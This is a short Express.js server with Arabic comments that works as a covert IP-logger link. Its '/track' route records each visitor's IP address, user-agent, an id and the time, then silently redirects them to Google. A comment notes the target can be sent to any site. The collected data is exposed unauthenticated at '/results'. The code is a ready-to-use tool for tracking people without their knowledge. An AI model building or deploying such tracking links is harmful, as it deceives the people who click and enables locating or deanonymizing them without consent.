const express = require('express');
const app = express();
const port = 3000;

// قائمة لتخزين البيانات
let locations = [];

app.get('/', (req, res) => {
    res.send('مرحباً!');
});

// رابط التتبع
app.get('/track', (req, res) => {
    const userId = req.query.id;
    const ip = req.ip;
    
    // حفظ المعلومات
    locations.push({
        id: userId,
        ip: ip,
        time: new Date(),
        browser: req.headers['user-agent']
    });
    
    console.log('✅ تم تسجيل دخول:', { id: userId, ip: ip });
    
    // يمكنك توجيهه لأي موقع تريد
    res.redirect('https://google.com');
});

// صفحة لعرض النتائج
app.get('/results', (req, res) => {
    res.json(locations);
});

app.listen(port, () => {
    console.log(`الخادم يعمل على http://localhost:${port}`);
});
